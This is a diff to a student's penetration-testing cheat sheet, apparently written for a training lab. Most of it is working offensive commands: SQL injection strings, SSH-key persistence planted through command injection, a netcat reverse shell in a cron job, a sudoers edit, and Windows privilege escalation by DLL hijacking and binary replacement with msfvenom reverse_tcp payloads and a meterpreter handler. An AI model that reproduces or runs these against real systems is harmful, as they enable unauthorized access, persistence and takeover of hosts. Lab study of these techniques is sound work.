@@ -18,7 +18,8 @@ NMAP SCRIPTS
 smb-os-discovery
 http-enum
 
-ssh -S /tmp/data data -O forward -L 9999:192.168.28.9:3389                         ###RDP TUNNEL###
+                                      ###RDP TUNNEL###
+ssh -S /tmp/data data -O forward -L 9999:192.168.28.9:3389                         
 xfreerdp /v:127.0.0.1:9999 /u:comrade /glyph-cache /clipboard /dynamic-resolution
 
 
@@ -29,7 +30,7 @@ UPLOAD SSH KEY TO WEB SERVER:
   ; whoami                                                #FIND OUT WHO YOU ARE
   ; cat /etc/passwd                                       #FIND HOME DIRECTORY
   ssh-keygen                                              #CREATE SSH KEY
-  cat /home/student/.ssh/id_rsa.pub                       #LOOK AT SSH KEY
+  cat /home/student/.ssh/id_rsa.pub                       #LOOK AT PUBLIC SSH KEY
   ; mkdir /var/www/.ssh                                   #MAKE .ssh directory
   ; echo "COPIED KEY" >> /var/www/.ssh/authorized_keys    #ECHO YOUR KEY INTO THE .ssh DIRECTORY
 
@@ -54,7 +55,7 @@ tom' OR 1='1
 username=tom%27+OR+1%3D%271&passwd=tom%27+OR+1%3D%271 -> URL....php?username=tom%27+OR+1%3D%271&passwd=tom%27+OR+1%3D%271
 
 
-          ###POST METHOD###
+          ###POST METHOD###StudentPrivPassword
 
   Ford' OR 1='1                       #DID NOT WORK
   Dodge' OR 1='1                      #DID NOT WORK
@@ -215,6 +216,7 @@ GTFO bins to see what commands you have sudo access to can be used to possibly e
     find / -type f -perm /6000 -ls 2>/dev/null   #FINDS BOTH
 (3)
     Check Binaries found against gtfo database to see what might work for privledge escalation.
+    https://gtfobins.github.io/#
 ----------------------------------------------------------------------------------------------------------------------------
         ###INSECURE PERMISSIONS###
 CRON STUFF
@@ -254,18 +256,39 @@ cd `printf "/var/tmp\n/tmp\n"|sort -R | head -n 1`;ls
 
 @lin2  !#/bin/bash
 @lin2  nc -c /bin/bash 10.50.20.72 4545
-----------------------------------------------------------------------------------------------------------------------------
+
+/etc/sudoers
 comrade ALL=(ALL:ALL) ALL    #ALLOWS COMRADE TO SUDO EVERYTHING
+----------------------------------------------------------------------------------------------------------------------------
+        ###WINDOWS PRIVLEDGE ESCELATION###
 
+       ###Finding vulnerable Scheduled Tasks###
+GUI Task Scheduler
+schtasks /query /fo LIST /v
+        ###FINDING VULNERABLE SERVICES####
+GUI Services
+sc query
 
+###MALICIOUS DLL###
+(1) Services                #SORT BY DESCRIPTION AND FIND ONE WITH NO DESCRIPTION OR AN UNPROFESSIONAL ONE
+(2) Open Procmon and find what .dll is NAME NOT FOUND in a place that we have write permissions
+(3) Create malicous .dll | msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\Users\student\Desktop\whoami.txt' -f dll > SSPICLI.dll
+(4) scp it to windows target and run the service (or restart box)
 
+msfvenom -p windows/shell/reverse_tcp LHOST=10.50.20.72 LPORT=6969 -f dll > hijackmeplz.dll
+msfconsole
+use multi/handlder
+set payload windows/meterpreter/reverse_tcp
+set LHOST 0.0.0.0
+set LPORT 6969
 
+###REPLACING EXE###
+(1) Try to rename .exe being ran
+(2) Create new exe |  msfvenom -p windows/exec CMD='cmd.exe /C "hostname" > C:\Users\student\Desktop\hostname.txt' -f exe > putty.exe
+(3) scp it to windows target and run service (or restart box)
 
-
-
-
-
-
+###VIEWING AUDITING POLICY###
+auditpol /get /category:* | findstr /i "success failure"
 
 
 
